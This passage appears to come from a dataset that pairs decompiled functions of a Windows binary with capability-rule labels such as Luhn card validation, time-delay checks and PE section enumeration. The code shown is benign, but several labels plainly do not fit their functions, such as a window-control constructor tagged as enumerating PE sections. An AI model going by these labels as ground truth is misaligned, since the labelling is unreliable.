0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1b) - *(arg_ch + arg_10h + -0x1b);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x1a:\n        uVar1 = *(arg_8h + arg_10h + -0x1a);\n        if (uVar1 != *(arg_ch + arg_10h + -0x1a)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1a);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x17) - *(arg_ch + arg_10h + -0x17);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x16:\n        uVar1 = *(arg_8h + arg_10h + -0x16);\n        if (uVar1 != *(arg_ch + arg_10h + -0x16)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x16);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x13) - *(arg_ch + arg_10h + -0x13);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x12:\n        uVar1 = *(arg_8h + arg_10h + -0x12);\n        if (uVar1 != *(arg_ch + arg_10h + -0x12)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x12);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xf) - *(arg_ch + arg_10h + -0xf);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0xe:\n        uVar1 = *(arg_8h + arg_10h + -0xe);\n        if (uVar1 != *(arg_ch + arg_10h + -0xe)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xe);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xb) - *(arg_ch + arg_10h + -0xb);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 10:\n        uVar1 = *(arg_8h + arg_10h + -10);\n        if (uVar1 != *(arg_ch + arg_10h + -10)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -10);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 6:\n        uVar1 = *(arg_8h + arg_10h + -6);\n        if (uVar1 != *(arg_ch + arg_10h + -6)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -6);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -4) - *(arg_ch + arg_10h + -4);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 2:\n        if (*(arg_8h + arg_10h + -2) == *(arg_ch + arg_10h + -2)) {\n            return 0;\n        }\n        break;\n    case 0x1f:\n        uVar1 = *(arg_8h + arg_10h + -0x1f);\n        if (uVar1 != *(arg_ch + arg_10h + -0x1f)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1f);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1e) - *(arg_ch + arg_10h + -0x1e);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1d) - *(arg_ch + arg_10h + -0x1d);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1c) - *(arg_ch + arg_10h + -0x1c);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x1b:\n        uVar1 = *(arg_8h + arg_10h + -0x1b);\n        if (uVar1 != *(arg_ch + arg_10h + -0x1b)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x1b);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x1a) - *(arg_ch + arg_10h + -0x1a);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x19) - *(arg_ch + arg_10h + -0x19);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x18) - *(arg_ch + arg_10h + -0x18);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x17:\n        uVar1 = *(arg_8h + arg_10h + -0x17);\n        if (uVar1 != *(arg_ch + arg_10h + -0x17)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x17);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x16) - *(arg_ch + arg_10h + -0x16);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x15) - *(arg_ch + arg_10h + -0x15);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x14) - *(arg_ch + arg_10h + -0x14);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0x13:\n        uVar1 = *(arg_8h + arg_10h + -0x13);\n        if (uVar1 != *(arg_ch + arg_10h + -0x13)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0x13);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x12) - *(arg_ch + arg_10h + -0x12);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x11) - *(arg_ch + arg_10h + -0x11);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0x10) - *(arg_ch + arg_10h + -0x10);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0xf:\n        uVar1 = *(arg_8h + arg_10h + -0xf);\n        if (uVar1 != *(arg_ch + arg_10h + -0xf)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xf);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xe) - *(arg_ch + arg_10h + -0xe);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xd) - *(arg_ch + arg_10h + -0xd);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -0xc) - *(arg_ch + arg_10h + -0xc);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 0xb:\n        uVar1 = *(arg_8h + arg_10h + -0xb);\n        if (uVar1 != *(arg_ch + arg_10h + -0xb)) {\n            iVar2 = (uVar1 & 0xff) - *(arg_ch + arg_10h + -0xb);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -10) - *(arg_ch + arg_10h + -10);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -9) - *(arg_ch + arg_10h + -9);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -8) - *(arg_ch + arg_10h + -8);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 7:\n        if (*(arg_8h + arg_10h + -7) != *(arg_ch + arg_10h + -7)) {\n            iVar2 = *(arg_8h + arg_10h + -7) - *(arg_ch + arg_10h + -7);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -6) - *(arg_ch + arg_10h + -6);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -5) - *(arg_ch + arg_10h + -5);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n            iVar2 = *(arg_8h + arg_10h + -4) - *(arg_ch + arg_10h + -4);\n            if (iVar2 != 0) {\n                iVar2 = (0 < iVar2) * 2 + -1;\n            }\n            if (iVar2 != 0) {\n                return iVar2;\n            }\n        }\n    case 3:\n        iVar2 = *(arg_8h + arg_10h + -3) - *(arg_ch + arg_10h + -3);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        break;\n    default:\n        goto code_r0x004789e1;\n    }\n    iVar2 = *(arg_8h + arg_10h + -2) - *(arg_ch + arg_10h + -2);\n    if (iVar2 != 0) {\n        iVar2 = (0 < iVar2) * 2 + -1;\n    }\n    if (iVar2 == 0) {\n        uVar3 = *(arg_8h + arg_10h + -1);\n        uVar1 = *(arg_ch + arg_10h + -1);\n        if (uVar3 != uVar1) {\n            return (0 < uVar3 - uVar1) * 2 + -1;\n        }\n        return 0;\n    }\n    return iVar2;\ncode_r0x004789e1:\n    if (*arg_8h != *arg_ch) {\n        iVar2 = (*arg_8h & 0xff) - *arg_ch;\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 1) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 2) - *(arg_ch + 2);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 3) - *(arg_ch + 3);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[1] != arg_ch[1]) {\n        iVar2 = (arg_8h[1] & 0xff) - *(arg_ch + 1);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 5) - *(arg_ch + 5);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 6) - *(arg_ch + 6);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 7) - *(arg_ch + 7);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[2] != arg_ch[2]) {\n        iVar2 = (arg_8h[2] & 0xff) - *(arg_ch + 2);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 9) - *(arg_ch + 9);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 10) - *(arg_ch + 10);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xb) - *(arg_ch + 0xb);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[3] != arg_ch[3]) {\n        iVar2 = (arg_8h[3] & 0xff) - *(arg_ch + 3);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xd) - *(arg_ch + 0xd);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xe) - *(arg_ch + 0xe);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0xf) - *(arg_ch + 0xf);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[4] != arg_ch[4]) {\n        iVar2 = (arg_8h[4] & 0xff) - *(arg_ch + 4);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x11) - *(arg_ch + 0x11);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x12) - *(arg_ch + 0x12);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x13) - *(arg_ch + 0x13);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[5] != arg_ch[5]) {\n        iVar2 = (arg_8h[5] & 0xff) - *(arg_ch + 5);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x15) - *(arg_ch + 0x15);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x16) - *(arg_ch + 0x16);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x17) - *(arg_ch + 0x17);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[6] != arg_ch[6]) {\n        iVar2 = (arg_8h[6] & 0xff) - *(arg_ch + 6);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x19) - *(arg_ch + 0x19);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1a) - *(arg_ch + 0x1a);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1b) - *(arg_ch + 0x1b);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    if (arg_8h[7] != arg_ch[7]) {\n        iVar2 = (arg_8h[7] & 0xff) - *(arg_ch + 7);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1d) - *(arg_ch + 0x1d);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1e) - *(arg_ch + 0x1e);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n        iVar2 = *(arg_8h + 0x1f) - *(arg_ch + 0x1f);\n        if (iVar2 != 0) {\n            iVar2 = (0 < iVar2) * 2 + -1;\n        }\n        if (iVar2 != 0) {\n            return iVar2;\n        }\n    }\n    arg_8h = arg_8h + 8;\n    arg_ch = arg_ch + 8;\n    arg_10h = arg_10h + -0x20;\n    goto code_r0x00478e68;\n}\n",
        "token_count": 13100
    },
    "00432945": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00432945(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00433878(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 109
    },
    "004561ab": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004561ab(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&var_8h);\n    iVar2 = (var_4h + -0x19db1de) - (var_8h < 0xd53e8000);\n    if ((iVar2 < 0x4c4b25) && ((iVar2 < 0x4c4b24 || (var_8h + 0x2ac18000 < 0xe1404000)))) {\n        uVar1 = fcn.00476cf0(var_8h + 0x2ac18000, iVar2, 10000000, 0);\n    }\n    else {\n        uVar1 = 0xffffffff;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 257
    },
    "004564ba": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004564ba(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(&var_8h);\n    iVar2 = (var_4h + -0x19db1de) - (var_8h < 0xd53e8000);\n    if ((iVar2 < 0x4c4b25) && ((iVar2 < 0x4c4b24 || (var_8h + 0x2ac18000 < 0xe1404000)))) {\n        uVar1 = fcn.00476cf0(var_8h + 0x2ac18000, iVar2, 10000000, 0);\n    }\n    else {\n        uVar1 = 0xffffffff;\n    }\n    if (arg_8h != NULL) {\n        *arg_8h = uVar1;\n    }\n    return uVar1;\n}\n",
        "token_count": 257
    },
    "00466884": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466884(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0045d185(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 69
    },
    "00401640": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.00401640(code **param_1)\n\n{\n    code *pcVar1;\n    char cVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_DefWindowProcW;\n    param_1[1] = NULL;\n    param_1[5] = NULL;\n    param_1[6] = NULL;\n    param_1[7] = NULL;\n    param_1[8] = pcVar1;\n    cVar2 = fcn.00406560();\n    if (cVar2 != '\\0') {\n        (*_sym.imp.UxTheme.dll_BufferedPaintInit)();\n    }\n    param_1[9] = NULL;\n    param_1[10] = 0x2;\n    *(param_1 + 0xb) = ZEXT816(0);\n    param_1[0xb] = 0x10;\n    *param_1 = vtable.WTL::CAeroCtrlImpl_class_WTL::CStaticT_class_ATL::CWindow__.0;\n    return param_1;\n}\n",
        "token_count": 231
    },
    "00446dc8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446dc8(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    in_ECX[2] = arg_8h;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    *(in_ECX + 6) = 0;\n    in_ECX[7] = 0;\n    in_ECX[8] = 0;\n    in_ECX[9] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xd] = 0;\n    *(in_ECX + 0xe) = 0;\n    in_ECX[0x10f] = 0;\n    in_ECX[0x110] = 0;\n    return;\n}\n",
        "token_count": 216
    },
    "00446e0f": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446e0f(uint arg_8h)\n\n{\n    uint *in_ECX;\n    uint var_4h;\n    \n    in_ECX[2] = arg_8h;\n    *(in_ECX + 0x2e) = 0;\n    *in_ECX = 0;\n    in_ECX[1] = 0;\n    in_ECX[3] = 0;\n    in_ECX[4] = 0;\n    in_ECX[5] = 0;\n    *(in_ECX + 6) = 0;\n    in_ECX[7] = 0;\n    in_ECX[8] = 0;\n    in_ECX[9] = 0;\n    *(in_ECX + 0xb) = 0;\n    in_ECX[0xd] = 0;\n    *(in_ECX + 0xe) = 0;\n    in_ECX[0x10f] = 0;\n    in_ECX[0x110] = 0;\n    return;\n}\n",
        "token_count": 233
    },
    "00446e5b": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
